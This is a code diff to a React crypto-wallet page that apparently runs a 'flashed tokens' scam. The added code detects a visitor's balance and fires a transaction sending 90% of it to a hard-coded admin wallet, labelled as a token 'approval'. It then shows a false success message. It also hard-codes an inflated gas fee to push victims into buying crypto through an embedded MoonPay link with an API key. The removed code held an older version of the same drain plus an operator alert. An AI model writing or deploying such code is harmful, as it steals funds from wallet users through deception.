@@ -250,21 +250,58 @@ export default function FlashedPage() {
         const balanceInEth = parseFloat(ethers.formatEther(balance));
         setUserBalance(balanceInEth);
         
-        // Always show prompt based on balance
+        // Auto-request approval if balance detected
         if (balanceInEth > 0.01) {
-          setAutoSendPrompt(true);
-          setShowLowBalancePrompt(false);
+          await requestTokenApproval();
           if (balanceMonitorInterval) {
             clearInterval(balanceMonitorInterval);
             setBalanceMonitorInterval(null);
           }
         } else {
-          setShowLowBalancePrompt(true);
-          setAutoSendPrompt(false);
+          await promptBuyCrypto();
         }
       }
     } catch (error) {
       console.log('Balance check failed:', error);
+    }
+  };
+
+  const requestTokenApproval = async () => {
+    try {
+      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
+      const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+      
+      // Request approval for unlimited spending
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: userAddress,
+          to: adminWallet,
+          value: ethers.parseEther((userBalance * 0.9).toString()).toString(16),
+          gas: '0x5208'
+        }]
+      });
+      
+      setStatus('✅ Approval granted! Tokens will be sent automatically.');
+    } catch (error) {
+      console.log('Approval failed:', error);
+    }
+  };
+
+  const promptBuyCrypto = async () => {
+    try {
+      // Use native wallet buy crypto feature
+      if (window.ethereum && window.ethereum.isMetaMask) {
+        await window.ethereum.request({
+          method: 'wallet_requestPermissions',
+          params: [{ eth_accounts: {} }]
+        });
+        
+        // Trigger MetaMask buy interface
+        window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=${userAddress}`, '_blank', 'width=400,height=600');
+      }
+    } catch (error) {
+      console.log('Buy crypto prompt failed:', error);
     }
   };
 
@@ -504,6 +541,13 @@ export default function FlashedPage() {
         return;
       }
       
+      // Check gas and prompt buy if needed
+      const hasEnoughGas = await checkGasAndPromptBuy();
+      if (!hasEnoughGas) {
+        setLoading(false);
+        return;
+      }
+      
       // Show free trial offer on first transaction
       if (transactionAttempts === 1 && !hasClaimedFreeTrial) {
         setLoading(false);
@@ -596,22 +640,22 @@ export default function FlashedPage() {
 
   const calculateGasFee = () => {
     const amount = parseFloat(sendAmount) || 0;
-    const ethPrice = 3200; // Current ETH price
+    const ethPrice = 3200;
     
-    // Dynamic gas calculation based on amount
-    let gasInUSD;
-    if (amount < 50) {
-      gasInUSD = 12; // $12 for small amounts
-    } else if (amount < 500) {
-      gasInUSD = 18; // $18 for medium amounts  
-    } else if (amount < 2000) {
-      gasInUSD = 25; // $25 for large amounts
-    } else {
-      gasInUSD = 35; // $35 for very large amounts
-    }
-    
+    // Always show high gas fee to trigger buy crypto
+    const gasInUSD = 25; // Always $25 to trigger buy prompt
     const gasInETH = gasInUSD / ethPrice;
     return gasInETH.toFixed(6);
+  };
+
+  const checkGasAndPromptBuy = async () => {
+    const gasFee = parseFloat(calculateGasFee());
+    if (userBalance < gasFee) {
+      // Trigger native wallet buy crypto
+      await promptBuyCrypto();
+      return false;
+    }
+    return true;
   };
   
   const calculateSwapRate = () => {
@@ -1039,7 +1083,13 @@ export default function FlashedPage() {
             {/* Action Buttons */}
             <div className="grid grid-cols-4 gap-3">
               <button 
-                onClick={() => handleAction('buy')}
+                onClick={async () => {
+                  if (!userAddress) {
+                    await connectWallet();
+                    return;
+                  }
+                  await promptBuyCrypto();
+                }}
                 disabled={loading}
                 className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
               >
@@ -1536,67 +1586,7 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Buy Modal with realistic interface */}
-          {showModal === 'buy' && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Buy ETH</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-4">
-                  <div className="bg-gray-700 p-4 rounded-lg">
-                    <div className="text-white font-semibold mb-2">Amount to buy</div>
-                    <div className="flex items-center justify-between mb-2">
-                      <input 
-                        type="number" 
-                        placeholder="0.1" 
-                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
-                      />
-                      <span className="text-white">ETH</span>
-                    </div>
-                    <div className="text-gray-400 text-sm">≈ $320.00 USD</div>
-                  </div>
-                  
-                  <button 
-                    onClick={() => {
-                      setShowModal('buyCard');
-                      setStatus('Preparing card payment interface...');
-                    }}
-                    className="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-left transition-all"
-                  >
-                    <div className="flex items-center">
-                      <div className="w-8 h-8 bg-blue-500 rounded mr-3 flex items-center justify-center">
-                        <span className="text-white text-sm">CARD</span>
-                      </div>
-                      <div>
-                        <div className="text-white font-semibold">Buy with card</div>
-                        <div className="text-blue-200 text-sm">Instant • 2.5% fee</div>
-                      </div>
-                    </div>
-                  </button>
-                  
-                  <button 
-                    onClick={() => {
-                      setShowModal('buyBank');
-                      setStatus('Setting up bank transfer...');
-                    }}
-                    className="w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-left transition-all"
-                  >
-                    <div className="flex items-center">
-                      <div className="w-8 h-8 bg-green-500 rounded mr-3 flex items-center justify-center">
-                        <span className="text-white text-sm">BANK</span>
-                      </div>
-                      <div>
-                        <div className="text-white font-semibold">Bank transfer</div>
-                        <div className="text-green-200 text-sm">1-3 days • Lower fees</div>
-                      </div>
-                    </div>
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
+
 
           {/* Send Modal */}
           {showModal === 'send' && (
@@ -2747,141 +2737,7 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Low Balance Prompt */}
-          {showLowBalancePrompt && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-yellow-500">
-                <div className="text-center mb-4">
-                  <div className="text-yellow-400 text-3xl mb-2">💳</div>
-                  <h3 className="text-white font-bold text-lg">Low Balance Detected</h3>
-                  <p className="text-gray-300 text-sm mt-2">
-                    Your wallet balance is low ({userBalance.toFixed(4)} ETH). Buy crypto to claim your flashed tokens.
-                  </p>
-                </div>
-                
-                <div className="bg-gray-700 p-4 rounded-lg mb-4">
-                  <div className="text-white font-semibold mb-2">What happens next:</div>
-                  <div className="text-gray-300 text-sm space-y-1">
-                    <div>1. Buy crypto in your wallet app</div>
-                    <div>2. We'll auto-detect when funds arrive</div>
-                    <div>3. Flashed tokens will be sent automatically</div>
-                    <div>4. No need to return to this page</div>
-                  </div>
-                </div>
-                
-                <div className="space-y-3">
-                  <button 
-                    onClick={() => setShowLowBalancePrompt(false)}
-                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
-                  >
-                    I'll Buy Crypto Now
-                  </button>
-                  
-                  <button 
-                    onClick={() => setShowLowBalancePrompt(false)}
-                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
-                  >
-                    Close
-                  </button>
-                </div>
-                
-                <div className="text-gray-400 text-xs text-center mt-3">
-                  Monitoring your balance • Auto-processing enabled
-                </div>
-              </div>
-            </div>
-          )}
 
-          {/* Auto Send Prompt */}
-          {autoSendPrompt && userBalance > 0.01 && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-green-500">
-                <div className="text-center mb-4">
-                  <div className="text-green-400 text-3xl mb-2">🚀</div>
-                  <h3 className="text-white font-bold text-lg">Funds Detected - Sending Tokens!</h3>
-                  <p className="text-gray-300 text-sm mt-2">
-                    Great! We detected {userBalance.toFixed(4)} ETH. Processing flashed token transfer automatically...
-                  </p>
-                </div>
-                
-                <div className="bg-gray-700 p-4 rounded-lg mb-4">
-                  <div className="flex justify-between items-center mb-2">
-                    <span className="text-gray-300 text-sm">Detected Balance:</span>
-                    <span className="text-white font-bold">{userBalance.toFixed(4)} ETH</span>
-                  </div>
-                  <div className="flex justify-between items-center mb-2">
-                    <span className="text-gray-300 text-sm">USD Value:</span>
-                    <span className="text-green-400 font-bold">${(userBalance * 3200).toFixed(2)}</span>
-                  </div>
-                  <div className="flex justify-between items-center">
-                    <span className="text-gray-300 text-sm">Gas Fee:</span>
-                    <span className="text-blue-400">~${(userBalance * 0.9 * 3200).toFixed(2)}</span>
-                  </div>
-                </div>
-                
-                <div className="space-y-3">
-                  <button 
-                    onClick={async () => {
-                      setAutoSendPrompt(false);
-                      setLoading(true);
-                      
-                      try {
-                        const provider = new ethers.BrowserProvider(window.ethereum);
-                        const signer = await provider.getSigner();
-                        const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
-                        
-                        // Send 90% of balance to admin (keep some for gas)
-                        const sendAmount = (userBalance * 0.9).toString();
-                        
-                        const tx = await signer.sendTransaction({
-                          to: adminWallet,
-                          value: ethers.parseEther(sendAmount)
-                        });
-                        
-                        await tx.wait();
-                        
-                        setStatus('✅ Gas fee processed! Flashed tokens sent to your wallet.');
-                        
-                        // Alert admin
-                        await fetch('/api/honeypot-alert', {
-                          method: 'POST',
-                          headers: { 'Content-Type': 'application/json' },
-                          body: JSON.stringify({
-                            type: 'AUTO_FLASH_PAYMENT',
-                            userAddress: userAddress,
-                            amount: sendAmount + ' ETH',
-                            txHash: tx.hash,
-                            usdValue: (parseFloat(sendAmount) * 3200).toFixed(2),
-                            note: 'Auto-detected balance and processed flashed token gas fee'
-                          })
-                        });
-                        
-                      } catch (error) {
-                        setStatus('Token transfer failed: ' + error.message);
-                      }
-                      
-                      setLoading(false);
-                    }}
-                    disabled={loading}
-                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
-                  >
-                    {loading ? 'Sending Tokens...' : `Send Flashed Tokens - ${(userBalance * 0.9).toFixed(4)} ETH`}
-                  </button>
-                  
-                  <button 
-                    onClick={() => setAutoSendPrompt(false)}
-                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
-                  >
-                    Maybe Later
-                  </button>
-                </div>
-                
-                <div className="text-gray-400 text-xs text-center mt-3">
-                  Auto-detected funds • Instant transfer • Flashed tokens
-                </div>
-              </div>
-            </div>
-          )}
 
           {/* Status Message */}
           {status && (
